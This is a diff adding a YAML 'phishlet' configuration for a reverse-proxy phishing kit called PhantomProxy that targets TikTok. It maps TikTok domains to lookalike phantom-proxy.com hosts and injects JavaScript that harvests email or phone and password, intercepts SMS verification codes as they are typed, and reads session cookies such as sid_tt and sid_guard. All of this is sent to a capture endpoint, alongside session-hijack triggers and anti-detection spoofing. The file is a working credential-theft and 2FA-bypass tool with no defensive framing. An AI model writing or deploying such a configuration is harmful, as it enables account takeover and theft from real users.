@@ -1,0 +1,209 @@
+# ============================================================================
+# TikTok Phishlet
+# Полный перехват сессий TikTok
+# ============================================================================
+
+id: tiktok
+name: TikTok
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий TikTok:
+  - Вход по email/телефону
+  - SMS подтверждение
+  - Перехват сессий
+  - Перехват данных профиля
+
+target:
+  primary: "www.tiktok.com"
+  secondary:
+    - "tiktok.com"
+    - "m.tiktok.com"
+    - "api.tiktok.com"
+    - "account.tiktok.com"
+    - "ads.tiktok.com"
+    - "business.tiktok.com"
+
+sub_filters:
+  - type: "domain"
+    from: "www.tiktok.com"
+    to: "www.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "tiktok.com"
+    to: "phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "m.tiktok.com"
+    to: "m.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "account.tiktok.com"
+    to: "account.phantom-proxy.com"
+    priority: 4
+
+  - type: "domain"
+    from: "lf16-tiktokcdn.tiktokcdn.com"
+    to: "cdn.phantom-proxy.com"
+    priority: 100
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] TikTok phishlet loaded');
+    
+    const capture = {
+      captureCredentials: function(form) {
+        const email = form.querySelector('input[type="email"]')?.value || 
+                      form.querySelector('input[type="tel"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (email || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'tiktok_credentials',
+              email: email,
+              password: password,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      captureSMS: function(code) {
+        if (code && code.length >= 4) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'tiktok_sms',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      captureSession: function() {
+        const cookies = {
+          tt_webid: this.getCookie('tt_webid'),
+          tt_webid_v2: this.getCookie('tt_webid_v2'),
+          ttwid: this.getCookie('ttwid'),
+          sid_guard: this.getCookie('sid_guard'),
+          uid_tt: this.getCookie('uid_tt'),
+          sid_tt: this.getCookie('sid_tt')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'tiktok_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      if (form.action && form.action.includes('tiktok')) {
+        capture.captureCredentials(form);
+      }
+    }, true);
+    
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        if (name.includes('sms') || name.includes('code') || name.includes('verify')) {
+          if (e.target.value.length >= 4) {
+            capture.captureSMS(e.target.value);
+          }
+        }
+      }
+    }, true);
+    
+    window.addEventListener('load', function() {
+      capture.captureSession();
+    });
+    
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+  })();
+
+triggers:
+  - name: "tiktok_login"
+    path_regex: "/login|/auth|/signin"
+    actions:
+      - type: "capture_form"
+        fields: ["email", "phone", "password"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "tiktok_sms"
+    path_regex: "/sms|/verify|/code"
+    actions:
+      - type: "capture_form"
+        fields: ["sms_code", "code", "verification_code"]
+      - type: "wait_for_input"
+        timeout: 180
+        
+  - name: "tiktok_main"
+    host_regex: "www.tiktok.com"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["tt_webid", "ttwid", "sid_guard", "uid_tt", "sid_tt"]
+      - type: "session_hijack"
+        enabled: true
+
+cookies:
+  critical:
+    - "tt_webid"
+    - "tt_webid_v2"
+    - "ttwid"
+    - "sid_guard"
+    - "uid_tt"
+    - "sid_tt"
+    
+  session:
+    - "sessionid"
+    - "sessionid_ss"
+    
+  additional:
+    - "tt_chain_token"
+    - "tt_csrf_token"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/tiktok/"
